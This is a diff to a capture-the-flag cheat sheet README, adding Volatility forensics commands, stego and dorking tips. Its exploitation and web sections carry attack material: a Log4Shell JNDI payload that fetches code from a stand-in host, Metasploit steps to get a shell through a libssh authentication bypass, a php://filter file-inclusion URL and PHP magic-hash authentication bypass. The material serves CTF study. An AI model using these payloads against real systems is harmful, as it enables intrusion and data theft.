@@ -54,7 +54,7 @@ This file is auto generated using [build.py](build.py). To update it, update the
 
     Deduce the file type from the headers.
 
-* `binwalk`
+* `binwalk` <span style="color:red">❤️</span>
 
     Look for embedded files in other files.
 
@@ -428,9 +428,9 @@ Reversing binaries can be used to solve keygen (or crackme) challenges, or just 
 
 * `ltrace` - [Manual](http://man7.org/linux/man-pages/man1/ltrace.1.html)
 
-* `gdb` <span style="color:red">❤️</span> - [Wikipedia](https://en.wikipedia.org/wiki/GNU_Debugger)
+* `gdb` <span style="color:red">❤️</span> - [Wikipedia](https://en.wikipedia.org/wiki/GNU_Debugger) [CheatSheet](https://raw.githubusercontent.com/zxgio/gdb_gef-cheatsheet/master/gdb_gef-cheatsheet.pdf)
 
-	Most used debugger, can be impoved with [GEF](https://hugsy.github.io/gef/) <span style="color:red">❤️</span> or [PEDA](https://github.com/longld/peda). A lot of [cheatsheets](https://raw.githubusercontent.com/zxgio/gdb_gef-cheatsheet/master/gdb_gef-cheatsheet.pdf) exsists, here are a small one:
+	Most used debugger, can be impoved with [GEF](https://hugsy.github.io/gef/) <span style="color:red">❤️</span> or [PEDA](https://github.com/longld/peda). Here are the most common commands:
 
 
 	```bash
@@ -746,31 +746,31 @@ Tools that will help you to exploit a binary:
 
 
 
-* Heartbleed
+* `Heartbleed`
 
 	Metasploit module: `auxiliary/scanner/ssl/openssl_heartbleed`
 
 	Be sure to use `set VERBOSE true` to see the retrieved results. This can often contain a flag or some valuable information.
 
-* libssh - SSH
+* `libssh - SSH`
 
 	`libssh0.8.1` (or others??) is vulnerable to an easy and immediate login. Metasploit module: `auxiliary/scanner/ssh/libssh_auth_bypass`. Be sure to `set spawn_pty true` to actually receive a shell! Then `sessions -i 1` to interact with the shell spawned (or whatever appropriate ID)
 
-* Default credentials [CheatSheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)
+* `Default credentials` - [CheatSheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)
 
     Unconfigured system can use the default credentials to login.
 
-* Log4Shell
+* `Log4Shell`
 
 	Exploit on the Java library **Log4j**. Malicious code is fetched and executed from a remote JNDI server. A payload looks like `${jndi:ldap://exemple.com:1389/a}` and need to be parsed by Log4j.
 
-	[Simple POC](https://github.com/kozmer/log4j-shell-poc)
+	- [Simple POC](https://github.com/kozmer/log4j-shell-poc)
 	
-	[JNDI Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)
+	- [JNDI Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)
 
-	[ECW2022 author's WU](https://gist.github.com/Amossys-team/e99cc3b979b30c047e6855337fec872e#web---not-so-smart-api)
+	- [ECW2022 author's WU](https://gist.github.com/Amossys-team/e99cc3b979b30c047e6855337fec872e#web---not-so-smart-api)
 
-	[Request Bin](https://requestbin.net/) Usefull for detection and environment variable exfiltration.
+	- [Request Bin](https://requestbin.net/) Usefull for detection and environment variable exfiltration.
 <br><br>
 
 # Forensics
@@ -1005,25 +1005,27 @@ Memory dumps can be analyzed using the [Volatility Framework](https://www.volati
 
 Two versions of the framework are available:
 - [Volatility 2](https://github.com/volatilityfoundation/volatility) (Python 2)
-- [Volatility 3](https://github.com/volatilityfoundation/volatility3)
-Volatility 3 have currently less features but is easier to use. Volatility requires profiles which can sometimes be hard to find. Both versions are often used simultaneously.
+- [Volatility 3](https://github.com/volatilityfoundation/volatility3) (Python 3)
 
-The documentation can be found [here](https://volatility3.readthedocs.io)
+Volatility 3 have currently less features but is easier to use. Volatility requires **profiles** which can sometimes be hard to find. Both versions are often used simultaneously.
 
-* `Online Cheat Sheet` - [Website](https://blog.onfvp.com/post/volatility-cheatsheet/)
+The full documentation can be found [here](https://volatility3.readthedocs.io)
 
-* `Windows Memory Forensics` - [Website](https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html#)
+* `CheatSheet for volatility3` - [Website](https://blog.onfvp.com/post/volatility-cheatsheet/)
 
-* `Linux Memory Forensics` - [Website](https://volatility3.readthedocs.io/en/latest/getting-started-linux-tutorial.html)
+* `CheatSheet for volatility2` - [PDF](https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf)
 
-* Most useful plugins
+
+* `Most useful volatility plugins`
 
     | Plugin | Description |
     | --- | --- |
     | `pslist` | List all processes |
     | `filescan` | List all files |
-    | `filedump` | Dump a file from memory |
+    | `filedump` | Dump a file from memory, usually works better with vol2 |
     | `netscan` | List all network connections |
+
+* `Volatility 3 quick start`
 
     Some usefull windows commands:
     ```bash
@@ -1033,10 +1035,10 @@ The documentation can be found [here](https://volatility3.readthedocs.io)
 
     # General information
     sudo vol -f $DUMP_NAME windows.info # Get windows version
-    sudo vol -f $DUMP_NAME windows.filescan > out/filescan.txt # List all files
-    sudo vol -f $DUMP_NAME windows.pslist > out/pslist.txt # List all running processes
-    sudo vol -f $DUMP_NAME windows.pstree > out/pstree.txt # List all running processes as a tree
-    sudo vol -f $DUMP_NAME windows.netscan > out/netscan.txt # List all network connections
+    sudo vol -f $DUMP_NAME windows.filescan > ./out/filescan.txt # List all files
+    sudo vol -f $DUMP_NAME windows.pslist > ./out/pslist.txt # List all running processes
+    sudo vol -f $DUMP_NAME windows.pstree > ./out/pstree.txt # List all running processes as a tree
+    sudo vol -f $DUMP_NAME windows.netscan > ./out/netscan.txt # List all network connections
     sudo vol -f $DUMP_NAME windows.cmdlines > ./out/cmdlines.txt # List all commands executed and their arguments (arguments are usually very interesting)
     
     # Specific information
@@ -1044,9 +1046,9 @@ The documentation can be found [here](https://volatility3.readthedocs.io)
     sudo vol -f $DUMP_NAME windows.handles --pid <pid> # List all handles of a process (files opened, etc...)
     
     # Registry
-    sudo vol -f $DUMP_NAME windows.registry.hivescan > out/hivescan.txt # List all registry hives
-    sudo vol -f $DUMP_NAME windows.registry.hivelist > out/hivelist.txt # List all registry hives
-    sudo vol -f $DUMP_NAME windows.registry.printkey.PrintKey --key 'Software\Microsoft\Windows\CurrentVersion\Run' > out/autoruns.txt # List all autoruns
+    sudo vol -f $DUMP_NAME windows.registry.hivescan > ./out/hivescan.txt # List all registry hives
+    sudo vol -f $DUMP_NAME windows.registry.hivelist > ./out/hivelist.txt # List all registry hives
+    sudo vol -f $DUMP_NAME windows.registry.printkey.PrintKey --key 'Software\Microsoft\Windows\CurrentVersion\Run' > ./out/autoruns.txt # List all autoruns
     ```
 
     Some usefull linux commands:
@@ -1057,10 +1059,10 @@ The documentation can be found [here](https://volatility3.readthedocs.io)
 
     # General information
     sudo vol -f $DUMP_NAME linux.info # Get linux version
-    sudo vol -f $DUMP_NAME linux.filescan > out/filescan.txt # List all files
-    sudo vol -f $DUMP_NAME linux.pslist > out/pslist.txt # List all running processes
-    sudo vol -f $DUMP_NAME linux.pstree > out/pstree.txt # List all running processes as a tree
-    sudo vol -f $DUMP_NAME linux.netscan > out/netscan.txt # List all network connections
+    sudo vol -f $DUMP_NAME linux.filescan > ./out/filescan.txt # List all files
+    sudo vol -f $DUMP_NAME linux.pslist > ./out/pslist.txt # List all running processes
+    sudo vol -f $DUMP_NAME linux.pstree > ./out/pstree.txt # List all running processes as a tree
+    sudo vol -f $DUMP_NAME linux.netscan > ./out/netscan.txt # List all network connections
     sudo vol -f $DUMP_NAME linux.cmdlines > ./out/cmdlines.txt # List all commands executed and their arguments (arguments are usually very interesting)
 
     # Specific information
@@ -1068,9 +1070,50 @@ The documentation can be found [here](https://volatility3.readthedocs.io)
     sudo vol -f $DUMP_NAME linux.handles --pid <pid> # List all handles of a process (files opened, etc...)
     ```
 
+* `Volatility 2 quick start`
+
+    Some usefull general commands:
+    ```bash
+    # Utility
+    export DUMP_NAME=memory.dmp
+    mkdir out
+
+    sudo vol2 --info | grep "Profile" # List all available profiles
+    sudo vol2 -f $DUMP_NAME imageinfo # Get information to find the profile
+    sudo vol2 -f $DUMP_NAME --info    # List plugins 
+    ```
+
+    Some usefull windows commands:
+    ```bash
+    export PROFILE=Win7SP1x64 # Replace with the profile found with imageinfo
+    sudo vol2 -f $DUMP_NAME --profile=$PROFILE filescan > ./out/filescan.txt # List all files
+    sudo vol2 -f $DUMP_NAME --profile=$PROFILE pslist > ./out/pslist.txt # List all running processes
+    sudo vol2 -f $DUMP_NAME --profile=$PROFILE pstree > ./out/pstree.txt # List all running processes as a tree
+    sudo vol2 -f $DUMP_NAME --profile=$PROFILE procdump --pid=<pid> --dump-dir=./out # Dump a process
+    sudo vol2 -f $DUMP_NAME --profile=$PROFILE cmdline > ./out/cmdline.txt # List all executed commands
+    sudo vol2 -f $DUMP_NAME --profile=$PROFILE netscan > ./out/netscan.txt # List all network connections
+    sudo vol2 -f $DUMP_NAME --profile=$PROFILE mftparser > ./out/mftparser.txt # List all files/changes in the MFT
+    ```
+
+    Some usefull linux commands:
+    ```bash
+    export PROFILE=LinuxUbuntu1604x64 # Replace with the profile found with imageinfo
+    sudo vol2 -f $DUMP_NAME --profile=$PROFILE linux_enumerate_files > ./out/enum_files.txt # List all files
+    sudo vol2 -f $DUMP_NAME --profile=$PROFILE linux_pslist > ./out/linux_pslist.txt # List all running processes
+    sudo vol2 -f $DUMP_NAME --profile=$PROFILE linux_pstree > ./out/linux_pstree.txt # List all running processes as a tree
+    sudo vol2 -f $DUMP_NAME --profile=$PROFILE linux_procdump --pid=<pid> --dump-dir=./out # Dump a process
+    ```
 
 
 
+* `bulk_extractor` - [GitHub](https://github.com/simsong/bulk_extractor)
+
+    Find various informations in a large binary dump.
+    
+    ```bash
+    mkdir out_bulk
+    bulk_extractor ./dump.bin -o ./out_bulk
+    ```
 
 * Browser profile
 
@@ -1509,9 +1552,9 @@ WHEN GIVEN A FILE TO WORK WITH, DO NOT FORGET TO RUN THIS STEGHIDE WITH AN EMPTY
 
 	This is similar to `stegcracker`.
 
-* `Stegsolve.jar` <span style="color:red">❤️</span> - [Website](http://www.caesum.com/handbook/stego.htm)
+* `Stegsolve.jar` <span style="color:red">❤️</span> - [Website](http://www.caesum.com/handbook/stego.htm) 
 
-	View the image in different colorspaces and alpha channels.
+	View the image in different colorspaces and alpha channels. I recommand using [this patched version](https://github.com/Giotino/stegsolve) to be able to zoom out.
 
 
 * `stepic` - [Website](http://domnit.org/stepic/doc/)
@@ -1521,6 +1564,10 @@ WHEN GIVEN A FILE TO WORK WITH, DO NOT FORGET TO RUN THIS STEGHIDE WITH AN EMPTY
 * [`APNG`]
 
 	Animated PNG. Use (apngdis)[https://sourceforge.net/projects/apngdis/] to extract the frames and delays.
+
+* `SVG Layers`
+
+	You can hide data in hidden layers in SVG files. `inkview` can be used to view and toggle the layers.
 
 * `Digital Invisible Ink Stego Tool` - [Website](http://diit.sourceforge.net/)
 
@@ -1737,10 +1784,10 @@ WHEN GIVEN A FILE TO WORK WITH, DO NOT FORGET TO RUN THIS STEGHIDE WITH AN EMPTY
 Dorking is the process of using search engines to find information about a target.
 
 
-* `Google Dorks` - [Wikipedia](https://en.wikipedia.org/wiki/Google_hacking)
+* `Google Dorks` - [Wikipedia](https://en.wikipedia.org/wiki/Google_hacking) [CheatSheet](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06) 
 
     Use Google's search engine to find indexed pages that contain specific information.
-    [This cheatsheet](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06) provides detailed information about Google Dorks.
+    provides detailed information about Google Dorks.
 
     The most common ones are:
     ```bash
@@ -1984,16 +2031,14 @@ DNS can be used to exfiltrate data, for example to bypass firewalls.
 
 
 
-* Magic Hashes
+* `Magic Hashes` - [CheatSheet](https://github.com/spaze/hashes)
 
-	A common vulnerability in [PHP](https://en.wikipedia.org/wiki/PHP) that fakes hash "collisions..." where the `==` operator falls short in [PHP](https://en.wikipedia.org/wiki/PHP) type comparison, thinking everything that follows `0e` is considered scientific notation (and therefore 0). More valuable info can be found here: [https://github.com/spaze/hashes](https://github.com/spaze/hashes).
+	In [PHP](https://en.wikipedia.org/wiki/PHP), the `==` applies type juggling, so if the hash starts with `0e`, then the hash will be evaluated as 0 (scientific notation). This can be used to bypass authentication.
 
 
-* `preg_replace`
+* `preg_replace` - [Manual](http://php.net/manual/en/function.preg-replace.php)
 
 	A bug in older versions of [PHP](https://en.wikipedia.org/wiki/PHP) where the user could get remote code execution
-
-	[http://php.net/manual/en/function.preg-replace.php](http://php.net/manual/en/function.preg-replace.php)
 
 
 * `phpdc.phpr` - [GitHub](https://github\.com/lighttpd/xcache/blob/master/bin/phpdc.phpr)
@@ -2001,12 +2046,12 @@ DNS can be used to exfiltrate data, for example to bypass firewalls.
 	A command-line tool to decode [`bcompiler`](http://php.net/manual/en/book.bcompiler.php) compiled [PHP](https://en.wikipedia.org/wiki/PHP) code.
 
 
-* ``php://filter` for Local File Inclusion` - [Website](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) 
+* `php://filter for Local File Inclusion` - [Website](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) 
 
 	A bug in [PHP](https://en.wikipedia.org/wiki/PHP) where if GET HTTP variables in the URL are controlling the navigation of the web page, perhaps the source code is `include`-ing other files to be served to the user. This can be manipulated by using [PHP filters](http://php.net/manual/en/filters.php) to potentially retrieve source code. Example like so:
 
 	```
-	http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
+	http://exemple.com/index.php?m=php://filter/convert.base64-encode/resource=index
 	```
 
 
@@ -2111,7 +2156,7 @@ SELECT * FROM users WHERE username = 'admin' AND password = "" OR 1=1--"
 
 
 
-* `robots.txt` <span style="color:red">❤️</span>
+* `/robots.txt` <span style="color:red">❤️</span>
 
 	File to tell search engines not to index certain files or directories.
 
@@ -2183,13 +2228,13 @@ These sites can be used to create hooks to catch HTTP requests:
 | [`hookbin.com`](https://hookbin.com/) |
 
 
-* `XSS Cheat sheet` - [Website](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+* `XSS Cheat sheet` - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
-* Filter Evasion
+* `Filter Evasion` - [CheatSheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 
-	[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) can be used to bypass XSS filters.
+	Bypass XSS filters.
 
-* `HTTPOnly` cookie flag
+* `HTTPOnly cookie flag`
 
 	When the `HTTPOnly` flag is set, the cookie is not accessible by JavaScript. This can be bypassed by using the target's browser as a proxy to recieve the cookie when it is sent to the victim's browser:
 
